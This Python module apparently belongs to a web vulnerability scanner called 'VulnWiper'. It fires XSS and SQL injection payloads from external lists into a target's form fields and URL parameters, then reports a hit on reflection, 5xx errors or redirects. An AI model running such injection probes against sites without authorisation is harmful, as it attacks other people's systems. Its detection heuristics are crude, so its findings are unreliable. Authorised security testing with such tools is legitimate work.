import sys, os
sys.path.append(os.path.abspath(os.path.join('VulnWiper')))

import Utility
from UtilityClasses import *

import requests
from colored_print import log

XSS_Payloads = Utility.SplitTextFile(r'VulnWiper\RedTeam\xss-payload-list.txt')

SQLi_Payloads = Utility.SplitTextFile(r'VulnWiper\RedTeam\mysql-payload-list.txt')

def CreateParameterPayload(params, payload):
    data = {}

    for param in params:
        data[param] = payload

    return data

# Launches XSS Form Payloads
def LaunchXSS_Form(orginialRequest, domain, params=[]):
    print('Launching XSS in Form')

    for payload in XSS_Payloads:
        request = requests.post(domain, data=CreateParameterPayload(params, payload))

        # Checks for reflected XSS
        if(str.find(request.text, payload) != -1):
            log.success('Likely XSS Vulnerability: ' + domain)
            log.success('Payload: ' + payload)
            return AttackResults(True, VulnerableDomain(domain, "Form XSS", payload))
        
        # Checks if the input is mishandled
        if request.status_code in (500,501,502,503):
            log.success('Likely XSS Vulnerability: ' + domain)
            log.success('Payload: ' + payload)
            return AttackResults(True, VulnerableDomain(domain, "Form XSS", payload))

    log.err('XSS in Form Not Found')
    return AttackResults(False, VulnerableDomain())

# Launches XSS URL Payloads
def LaunchXSS_URL(orginialRequest, domain, param):
    print('Launching XSS in URL')

    domain = Utility.GetParentDomain(domain)

    for payload in XSS_Payloads:
        payloadURL = domain + param + payload

        request = requests.post(payloadURL)

        # Checks for reflected XSS
        if(str.find(request.text, payload) != -1):
            log.success('Likely XSS Vulnerability: ' + domain)
            log.success('Payload: ' + payload)
            return AttackResults(True, VulnerableDomain(domain, "URL XSS", payload))
        
        # Checks if the input is mishandled
        if request.status_code in (500,501,502,503):
            log.success('Likely XSS Vulnerability: ' + domain)
            log.success('Payload: ' + payload)
            return AttackResults(True, VulnerableDomain(domain, "URL XSS", payload))

    log.err('XSS in URL Not Found')
    return AttackResults(False, VulnerableDomain())

# Launches SQLi Form payloads
def LaunchSQLi_Form(originalRequest, domain, params=[]):
    print("Launching SQLi in Form")

    checkedPages = Utility.LoadDomainsFromStorage()

    for payload in SQLi_Payloads:
        request = requests.post(domain, data=CreateParameterPayload(params, payload))

        # Checks if the input is mishandled
        if request.status_code in (500,501,502,503):
            log.success('Likely SQLi Vulnerability: ' + domain)
            log.success('Payload: ' + payload)
            return AttackResults(True, VulnerableDomain(domain, "Form SQLi", payload))
        
        # Checks if we've been redirected to an inaccessible page
        if(Utility.CheckForDomainValue(checkedPages, request.url) == False or request.status_code in (301,302)):
            log.success('Likely SQLi Vulnerability: ' + domain)
            log.success('Payload: ' + payload)

            checkedPages.append(VulnerableDomain(request.url, "Form SQLi", payload))
            Utility.WriteDomainsToStorage(checkedPages)

            return AttackResults(True, VulnerableDomain(domain, "Form SQLi", payload))
    
    log.err("SQLi Not Found")
    return AttackResults(False, VulnerableDomain())